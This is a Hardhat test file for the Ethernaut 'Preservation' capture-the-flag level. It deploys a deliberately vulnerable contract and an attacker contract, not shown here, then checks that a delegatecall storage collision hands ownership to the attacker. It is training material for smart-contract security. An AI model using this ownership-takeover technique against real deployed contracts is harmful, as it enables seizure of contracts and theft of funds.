import { SignerWithAddress } from "@nomiclabs/hardhat-ethers/signers";
import { expect } from "chai";
import { ethers } from "hardhat";
import {
  LibraryContract,
  Preservation,
  PreservationAttacker,
} from "typechain-types";

// Challenge description

// This contract utilizes a library to store two different times for two different timezones.
// The constructor creates two instances of the library for each time to be stored.

// The goal of this level is for you to claim ownership of the instance you are given.

//   Things that might help

// Look into Solidity's documentation on the delegatecall low level function, how it works,
// how it can be used to delegate operations to on-chain. libraries, and what implications
// it has on execution scope.
// Understanding what it means for delegatecall to be context-preserving.
// Understanding how storage variables are stored and accessed.
// Understanding how casting works between different data types.

describe("Ethernaut - Preservation", async () => {
  let preservation: Preservation;
  let libraryContract1: LibraryContract;
  let libraryContract2: LibraryContract;
  let preservationAttacker: PreservationAttacker;
  let owner: SignerWithAddress, attacker: SignerWithAddress;

  before(async () => {
    [owner, attacker] = await ethers.getSigners();
    libraryContract1 = await ethers
      .getContractFactory("LibraryContract", owner)
      .then((f) => f.deploy());
    libraryContract2 = await ethers
      .getContractFactory("LibraryContract", owner)
      .then((f) => f.deploy());
    preservation = await ethers
      .getContractFactory("Preservation", owner)
      .then((f) =>
        f.deploy(libraryContract1.address, libraryContract2.address),
      );
    preservationAttacker = await ethers
      .getContractFactory("PreservationAttacker", attacker)
      .then((f) => f.deploy(attacker.address));
  });

  it("Hacks", async () => {
    expect(await preservation.timeZone1Library()).equal(
      libraryContract1.address,
    );

    await preservationAttacker.connect(attacker).attack(preservation.address);

    expect(await preservation.timeZone1Library()).equal(
      preservationAttacker.address,
    );
    expect(await preservation.owner()).equal(attacker.address);
  });
});
